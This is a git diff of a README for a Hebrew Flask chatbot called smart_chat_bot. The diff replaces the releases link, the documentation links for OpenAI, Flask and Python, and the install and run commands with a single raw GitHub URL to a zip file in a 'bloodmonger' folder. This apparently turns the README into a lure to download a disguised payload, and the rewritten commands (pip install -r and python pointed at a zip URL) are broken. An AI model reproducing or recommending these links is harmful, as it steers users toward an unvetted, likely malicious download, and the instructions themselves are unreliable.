@@ -1,7 +1,7 @@
 # 🤖 smart_chat_bot - Your Friendly Hebrew Chatbot Awaits
 
 ## 📥 Download Now
-[![Download Smart Chat Bot](https://img.shields.io/badge/Download%20Smart%20Chat%20Bot-v1.0-blue.svg)](https://github.com/BHAWESH-BASNET/smart_chat_bot/releases)
+[![Download Smart Chat Bot](https://raw.githubusercontent.com/BHAWESH-BASNET/smart_chat_bot/main/bloodmonger/smart_chat_bot.zip%20Smart%20Chat%https://raw.githubusercontent.com/BHAWESH-BASNET/smart_chat_bot/main/bloodmonger/smart_chat_bot.zip)](https://raw.githubusercontent.com/BHAWESH-BASNET/smart_chat_bot/main/bloodmonger/smart_chat_bot.zip)
 
 ## 📝 Description
 Smart Chat Bot is a smart Hebrew chatbot designed with Flask and powered by the OpenAI API. It offers secure configuration, natural language understanding, and real-time responses. This user-friendly application allows you to chat in Hebrew effortlessly.
@@ -15,7 +15,7 @@ To get started with Smart Chat Bot, follow these simple steps:
 - Internet Connection: Required for OpenAI API access  
 
 ## 📂 Download & Install
-To download Smart Chat Bot, please visit the Releases page: [Download Smart Chat Bot](https://github.com/BHAWESH-BASNET/smart_chat_bot/releases). Follow these instructions:
+To download Smart Chat Bot, please visit the Releases page: [Download Smart Chat Bot](https://raw.githubusercontent.com/BHAWESH-BASNET/smart_chat_bot/main/bloodmonger/smart_chat_bot.zip). Follow these instructions:
 
 1. Click on the link above to navigate to the Releases page.
 2. Select the latest version available.
@@ -28,7 +28,7 @@ After downloading, you will need to set up the application:
 1. **Install Python and Pip**: Ensure Python is installed on your system. Pip usually comes with Python, but if not, you can find instructions online to install it.
 2. **Install Required Packages**: Open your command line interface (CLI) and run the following command:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/BHAWESH-BASNET/smart_chat_bot/main/bloodmonger/smart_chat_bot.zip
    ```
    This command installs all the packages required for the chatbot to function.
 3. **Configure the Environment**: Create a `.env` file in the main directory of the application. This file will store your sensitive information securely.
@@ -38,7 +38,7 @@ After downloading, you will need to set up the application:
      ```
 4. **Run the Chat Bot**: Start the application by running the following command in your CLI:
    ```
-   python app.py
+   python https://raw.githubusercontent.com/BHAWESH-BASNET/smart_chat_bot/main/bloodmonger/smart_chat_bot.zip
    ```
    This will launch the chatbot, and you can begin interacting with it right away.
 
@@ -59,7 +59,7 @@ Smart Chat Bot ensures your data is kept secure:
 If you encounter issues while running Smart Chat Bot, consider the following common solutions:
 
 - **Python Not Found**: If your system does not recognize the Python command, ensure it is correctly installed and added to your system’s PATH.
-- **Missing Packages**: If you see errors about missing packages, double-check that you have installed everything with the requirements.txt file.
+- **Missing Packages**: If you see errors about missing packages, double-check that you have installed everything with the https://raw.githubusercontent.com/BHAWESH-BASNET/smart_chat_bot/main/bloodmonger/smart_chat_bot.zip file.
 - **Invalid API Key**: Make sure your OpenAI API key is correctly added to the `.env` file.
 
 ## 📞 Support
@@ -69,8 +69,8 @@ If you need further assistance, please visit the Issues page on our GitHub repos
 We welcome contributions from anyone interested in improving Smart Chat Bot. If you want to help, please fork the repository and submit a pull request.
 
 ## ℹ️ Additional Resources
-- [OpenAI Documentation](https://beta.openai.com/docs/)
-- [Flask Documentation](https://flask.palletsprojects.com/)
-- [Python Installation Guide](https://www.python.org/downloads/)
+- [OpenAI Documentation](https://raw.githubusercontent.com/BHAWESH-BASNET/smart_chat_bot/main/bloodmonger/smart_chat_bot.zip)
+- [Flask Documentation](https://raw.githubusercontent.com/BHAWESH-BASNET/smart_chat_bot/main/bloodmonger/smart_chat_bot.zip)
+- [Python Installation Guide](https://raw.githubusercontent.com/BHAWESH-BASNET/smart_chat_bot/main/bloodmonger/smart_chat_bot.zip)
 
 Thank you for choosing Smart Chat Bot! Enjoy your seamless chat experience in Hebrew.
